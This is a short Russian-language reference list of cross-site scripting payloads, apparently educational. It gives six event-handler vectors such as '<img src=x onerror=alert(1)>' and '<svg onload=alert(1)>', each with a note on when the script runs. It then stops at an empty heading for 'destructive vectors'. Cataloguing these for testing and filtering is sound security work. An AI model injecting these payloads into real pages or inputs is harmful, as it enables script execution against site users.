1. Базовые теги с событиями

⚠️ ОПАСНЫЕ
▼
<img src=x onerror=alert(1)>
📝 Изображение с несуществующим src
⚡ Последствие: Выполнение JavaScript при загрузке страницы
<svg onload=alert(1)>
📝 SVG элемент с событием onload
⚡ Последствие: Выполнение при рендеринге SVG
<body onload=alert(1)>
📝 Событие загрузки body
⚡ Последствие: Выполняется после полной загрузки страницы
<input onfocus=alert(1) autofocus>
📝 Автоматический фокус на поле ввода
⚡ Последствие: Выполняется при получении фокуса
<div onmouseover=alert(1)>Текст</div>
📝 Событие наведения мыши
⚡ Последствие: Выполняется при наведении курсора
<div onclick=alert(1)>Кликни</div>
📝 Событие клика
⚡ Последствие: Выполняется при клике на элемент

5. Деструктивные векторы

▼
